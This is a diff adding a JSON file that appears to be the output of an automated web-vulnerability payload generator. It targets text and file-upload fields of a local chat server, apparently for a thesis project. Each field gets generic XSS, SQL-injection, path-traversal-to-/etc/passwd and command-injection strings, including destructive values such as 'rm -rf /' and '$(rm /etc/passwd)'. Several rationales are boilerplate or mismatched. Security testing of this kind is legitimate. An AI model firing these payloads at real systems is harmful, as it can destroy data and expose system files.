@@ -1,0 +1,326 @@
+{
+    "status": "complete",
+    "generated_targets": 20,
+    "payloads": [
+        {
+            "target": "form field 'unknown' on page 'dashboard' with URL http://localhost:8065/equipo-tesina/channels/town-square and field id 'post_textbox' of type textarea",
+            "payloads": [
+                "<script>alert('XSS')</script>",
+                "SELECT * FROM users WHERE id = 1",
+                "ls -l; echo 'Command Injection'",
+                "../../../etc/passwd",
+                "admin' OR 1=1 --"
+            ],
+            "rationale": "Testing for various web vulnerabilities including XSS, SQLi, command injection, path traversal, and auth bypass with short attack strings.",
+            "target_desc": "form field 'unknown' on page 'dashboard'",
+            "page_url": "http://localhost:8065/equipo-tesina/channels/town-square",
+            "action": "http://localhost:8065/equipo-tesina/channels/town-square",
+            "field_id": "post_textbox",
+            "field_name": "unknown"
+        },
+        {
+            "target": "form field 'unknown' on page 'dashboard'",
+            "payloads": [
+                "<script>alert('XSS')</script>",
+                "Robert'); DROP TABLE Students; --",
+                "$(rm /etc/passwd)",
+                "../../../../../../../../etc/passwd",
+                "username=admin&password=123"
+            ],
+            "rationale": "The insecure file permissions and lack of input validation on the file upload field make it vulnerable to various attacks.",
+            "target_desc": "form field 'unknown' on page 'dashboard'",
+            "page_url": "http://localhost:8065/equipo-tesina/channels/town-square",
+            "action": "http://localhost:8065/equipo-tesina/channels/town-square",
+            "field_id": "fileUploadInput",
+            "field_name": "unknown"
+        },
+        {
+            "target": "form field 'unknown' on page 'home' with URL http://localhost:8065/equipo-tesina/channels/canal-analisis, field id 'post_textbox', and field type 'textarea'",
+            "payloads": [
+                "<script>alert('XSS')</script>",
+                "SELECT * FROM users WHERE id = 1",
+                "ls -l",
+                "../../../../../etc/passwd",
+                "username=admin&password=123"
+            ],
+            "rationale": "Testing for various web vulnerabilities including XSS, SQLi, command injection, path traversal, and auth bypass.",
+            "target_desc": "form field 'unknown' on page 'home'",
+            "page_url": "http://localhost:8065/equipo-tesina/channels/canal-analisis",
+            "action": "http://localhost:8065/equipo-tesina/channels/canal-analisis",
+            "field_id": "post_textbox",
+            "field_name": "unknown"
+        },
+        {
+            "target": "form field 'unknown' on page 'home'",
+            "payloads": [
+                "<script>alert('XSS')</script>",
+                "SELECT * FROM users WHERE id = 1",
+                "ls -l; echo 'Command Injection'",
+                "../../../etc/passwd",
+                "admin' OR 1=1 --"
+            ],
+            "rationale": "Testing for vulnerabilities in the file upload field with various attack strings.",
+            "target_desc": "form field 'unknown' on page 'home'",
+            "page_url": "http://localhost:8065/equipo-tesina/channels/canal-analisis",
+            "action": "http://localhost:8065/equipo-tesina/channels/canal-analisis",
+            "field_id": "fileUploadInput",
+            "field_name": "unknown"
+        },
+        {
+            "target": "form field 'unknown' on page 'profile' with URL http://localhost:8065/equipo-tesina/messages/@usuario_test and field id 'post_textbox' of type textarea",
+            "payloads": [
+                "<script>alert('XSS')</script>",
+                "SELECT * FROM users WHERE id = 1",
+                "ls -l",
+                "../../../../etc/passwd",
+                "username=admin&password=123"
+            ],
+            "rationale": "Testing for various vulnerabilities including XSS, SQLi, command injection, path traversal, and auth bypass with short attack strings.",
+            "target_desc": "form field 'unknown' on page 'profile'",
+            "page_url": "http://localhost:8065/equipo-tesina/messages/@usuario_test",
+            "action": "http://localhost:8065/equipo-tesina/messages/@usuario_test",
+            "field_id": "post_textbox",
+            "field_name": "unknown"
+        },
+        {
+            "target": "form field 'unknown' on page 'profile'",
+            "payloads": [
+                "<script>alert('XSS')</script>",
+                "UNION SELECT * FROM users",
+                "rm -rf /",
+                "../../../../etc/passwd",
+                "username=admin&password=123"
+            ],
+            "rationale": "Testing for vulnerabilities in the file upload field on the profile page.",
+            "target_desc": "form field 'unknown' on page 'profile'",
+            "page_url": "http://localhost:8065/equipo-tesina/messages/@usuario_test",
+            "action": "http://localhost:8065/equipo-tesina/messages/@usuario_test",
+            "field_id": "fileUploadInput",
+            "field_name": "unknown"
+        },
+        {
+            "target": "form field 'unknown' on page 'search' with URL http://localhost:8065/equipo-tesina/channels/canal-analisis/search, field id 'post_textbox', and field type 'textarea'",
+            "payloads": [
+                "<script>alert('XSS')</script>",
+                "SELECT * FROM users WHERE id = 1",
+                "ls -l; echo 'Command Injection'",
+                "../../../etc/passwd",
+                "username=admin&password=123"
+            ],
+            "rationale": "Testing for common web vulnerabilities using a variety of attack strings.",
+            "target_desc": "form field 'unknown' on page 'search'",
+            "page_url": "http://localhost:8065/equipo-tesina/channels/canal-analisis/search",
+            "action": "http://localhost:8065/equipo-tesina/channels/canal-analisis/search",
+            "field_id": "post_textbox",
+            "field_name": "unknown"
+        },
+        {
+            "target": "form field 'unknown' on page 'search'",
+            "payloads": [
+                "<script>alert('XSS')</script>",
+                "UNION SELECT * FROM users",
+                "$(rm /etc/passwd)",
+                "../../../../../../../../etc/passwd",
+                "username=admin&password=123"
+            ],
+            "rationale": "Testing for vulnerabilities in the file upload field with various attack strings.",
+            "target_desc": "form field 'unknown' on page 'search'",
+            "page_url": "http://localhost:8065/equipo-tesina/channels/canal-analisis/search",
+            "action": "http://localhost:8065/equipo-tesina/channels/canal-analisis/search",
+            "field_id": "fileUploadInput",
+            "field_name": "unknown"
+        },
+        {
+            "target": "form field 'unknown' on page 'new_post' with URL http://localhost:8065/equipo-tesina/channels/off-topic and field id 'post_textbox' of type textarea",
+            "payloads": [
+                "<script>alert('XSS')</script>",
+                "SELECT * FROM users WHERE id = 1",
+                "ls -l; echo 'Command Injection'",
+                "../../../etc/passwd",
+                "username=admin&password=123"
+            ],
+            "rationale": "Testing for common web vulnerabilities using a variety of attack strings.",
+            "target_desc": "form field 'unknown' on page 'new_post'",
+            "page_url": "http://localhost:8065/equipo-tesina/channels/off-topic",
+            "action": "http://localhost:8065/equipo-tesina/channels/off-topic",
+            "field_id": "post_textbox",
+            "field_name": "unknown"
+        },
+        {
+            "target": "form field 'unknown' on page 'new_post' Page URL: http://localhost:8065/equipo-tesina/channels/off-topic Field id: fileUploadInput Field type: file",
+            "payloads": [
+                "<script>alert('XSS')</script>",
+                "Robert'); DROP TABLE Students; --",
+                "$(rm /etc/passwd)",
+                "../../../../../../../../etc/passwd",
+                "username=admin&password=123"
+            ],
+            "rationale": "The provided payloads cover various attack vectors to test the security of the target form field.",
+            "target_desc": "form field 'unknown' on page 'new_post'",
+            "page_url": "http://localhost:8065/equipo-tesina/channels/off-topic",
+            "action": "http://localhost:8065/equipo-tesina/channels/off-topic",
+            "field_id": "fileUploadInput",
+            "field_name": "unknown"
+        },
+        {
+            "target": "input 'unknown' on page 'http://localhost:8065/equipo-tesina/channels/canal-analisis'",
+            "payloads": [
+                "<script>alert('XSS')</script>",
+                "UNION SELECT * FROM users",
+                "rm -rf /",
+                "../../../../etc/passwd",
+                "admin' OR 1=1"
+            ],
+            "rationale": "Testing for common web vulnerabilities using a set of short attack strings.",
+            "target_desc": "input 'unknown' on page 'http://localhost:8065/equipo-tesina/channels/canal-analisis'",
+            "page_url": "http://localhost:8065/equipo-tesina/channels/canal-analisis",
+            "action": "http://localhost:8065/equipo-tesina/channels/canal-analisis",
+            "field_id": "post_textbox",
+            "field_name": "unknown"
+        },
+        {
+            "target": "input 'unknown' on page 'http://localhost:8065/equipo-tesina/channels/canal-analisis'",
+            "payloads": [
+                "<script>alert('XSS')</script>",
+                "Robert'); DROP TABLE Students; --",
+                "$(rm /etc/passwd)",
+                "../../../../../../../../etc/passwd",
+                "username=admin&password=123"
+            ],
+            "rationale": "The input field is vulnerable to various attacks due to insecure file permissions and lack of input validation.",
+            "target_desc": "input 'unknown' on page 'http://localhost:8065/equipo-tesina/channels/canal-analisis'",
+            "page_url": "http://localhost:8065/equipo-tesina/channels/canal-analisis",
+            "action": "http://localhost:8065/equipo-tesina/channels/canal-analisis",
+            "field_id": "fileUploadInput",
+            "field_name": "unknown"
+        },
+        {
+            "target": "input 'unknown' on page 'http://localhost:8065/equipo-tesina/messages/@usuario_test'",
+            "payloads": [
+                "<script>alert('XSS')</script>",
+                "SELECT * FROM users WHERE id = 1",
+                "ls -l",
+                "../../../../etc/passwd",
+                "username=admin&password=123"
+            ],
+            "rationale": "Testing for common web vulnerabilities using short attack strings.",
+            "target_desc": "input 'unknown' on page 'http://localhost:8065/equipo-tesina/messages/@usuario_test'",
+            "page_url": "http://localhost:8065/equipo-tesina/messages/@usuario_test",
+            "action": "http://localhost:8065/equipo-tesina/messages/@usuario_test",
+            "field_id": "post_textbox",
+            "field_name": "unknown"
+        },
+        {
+            "target": "input 'unknown' on page 'http://localhost:8065/equipo-tesina/messages/@usuario_test'",
+            "payloads": [
+                "<script>alert(1)</script>",
+                "SELECT * FROM users WHERE id = 1",
+                "ls -l",
+                "../../../../etc/passwd",
+                "username=admin&password=123"
+            ],
+            "rationale": "Testing for vulnerabilities in file upload functionality with various attack vectors.",
+            "target_desc": "input 'unknown' on page 'http://localhost:8065/equipo-tesina/messages/@usuario_test'",
+            "page_url": "http://localhost:8065/equipo-tesina/messages/@usuario_test",
+            "action": "http://localhost:8065/equipo-tesina/messages/@usuario_test",
+            "field_id": "fileUploadInput",
+            "field_name": "unknown"
+        },
+        {
+            "target": "input 'unknown' on page 'http://localhost:8065/equipo-tesina/channels/canal-analisis/search'",
+            "payloads": [
+                "<script>alert('XSS')</script>",
+                "UNION SELECT * FROM users",
+                "rm -rf /",
+                "../../../../etc/passwd",
+                "admin' OR 1=1"
+            ],
+            "rationale": "The input field is vulnerable to various attacks due to lack of proper validation and sanitization.",
+            "target_desc": "input 'unknown' on page 'http://localhost:8065/equipo-tesina/channels/canal-analisis/search'",
+            "page_url": "http://localhost:8065/equipo-tesina/channels/canal-analisis/search",
+            "action": "http://localhost:8065/equipo-tesina/channels/canal-analisis/search",
+            "field_id": "post_textbox",
+            "field_name": "unknown"
+        },
+        {
+            "target": "input 'unknown' on page 'http://localhost:8065/equipo-tesina/channels/canal-analisis/search'",
+            "payloads": [
+                "<script>alert('XSS')</script>",
+                "UNION SELECT * FROM users",
+                "$(rm /etc/passwd)",
+                "../../../../etc/passwd",
+                "username=admin&password=123"
+            ],
+            "rationale": "The input field is vulnerable to various attacks due to insecure file permissions and lack of input validation.",
+            "target_desc": "input 'unknown' on page 'http://localhost:8065/equipo-tesina/channels/canal-analisis/search'",
+            "page_url": "http://localhost:8065/equipo-tesina/channels/canal-analisis/search",
+            "action": "http://localhost:8065/equipo-tesina/channels/canal-analisis/search",
+            "field_id": "fileUploadInput",
+            "field_name": "unknown"
+        },
+        {
+            "target": "input 'unknown' on page 'http://localhost:8065/equipo-tesina/channels/off-topic'",
+            "payloads": [
+                "<script>alert('XSS')</script>",
+                "UNION SELECT * FROM users",
+                "rm -rf /",
+                "../../../../etc/passwd",
+                "admin' OR 1=1"
+            ],
+            "rationale": "Testing for common web vulnerabilities with a set of short attack strings.",
+            "target_desc": "input 'unknown' on page 'http://localhost:8065/equipo-tesina/channels/off-topic'",
+            "page_url": "http://localhost:8065/equipo-tesina/channels/off-topic",
+            "action": "http://localhost:8065/equipo-tesina/channels/off-topic",
+            "field_id": "post_textbox",
+            "field_name": "unknown"
+        },
+        {
+            "target": "input 'unknown' on page 'http://localhost:8065/equipo-tesina/channels/off-topic'",
+            "payloads": [
+                "<script>alert('XSS')</script>",
+                "Robert'); DROP TABLE Students; --",
+                "ls -l | bash",
+                "../../../../../../../../etc/passwd",
+                "username=admin&password=123"
+            ],
+            "rationale": "The input field is vulnerable to various attacks due to insecure file permissions and lack of input validation.",
+            "target_desc": "input 'unknown' on page 'http://localhost:8065/equipo-tesina/channels/off-topic'",
+            "page_url": "http://localhost:8065/equipo-tesina/channels/off-topic",
+            "action": "http://localhost:8065/equipo-tesina/channels/off-topic",
+            "field_id": "fileUploadInput",
+            "field_name": "unknown"
+        },
+        {
+            "target": "input 'unknown' on page 'http://localhost:8065/equipo-tesina/channels/off-topic'",
+            "payloads": [
+                "<script>alert('XSS')</script>",
+                "UNION SELECT * FROM users",
+                "rm -rf /",
+                "../../../../etc/passwd",
+                "admin' OR 1=1"
+            ],
+            "rationale": "Testing for common web vulnerabilities using a variety of attack strings.",
+            "target_desc": "input 'unknown' on page 'http://localhost:8065/equipo-tesina/channels/off-topic'",
+            "page_url": "http://localhost:8065/equipo-tesina/channels/off-topic",
+            "action": "http://localhost:8065/equipo-tesina/channels/off-topic",
+            "field_id": "post_textbox",
+            "field_name": "unknown"
+        },
+        {
+            "target": "input 'unknown' on page 'http://localhost:8065/equipo-tesina/channels/off-topic'",
+            "payloads": [
+                "<script>alert('XSS')</script>",
+                "Robert'); DROP TABLE Students; --",
+                "$(rm /etc/passwd)",
+                "../../../../../../../../etc/passwd",
+                "username=admin&password=123"
+            ],
+            "rationale": "Testing for vulnerabilities in file upload functionality with various attack vectors.",
+            "target_desc": "input 'unknown' on page 'http://localhost:8065/equipo-tesina/channels/off-topic'",
+            "page_url": "http://localhost:8065/equipo-tesina/channels/off-topic",
+            "action": "http://localhost:8065/equipo-tesina/channels/off-topic",
+            "field_id": "fileUploadInput",
+            "field_name": "unknown"
+        }
+    ]
+}
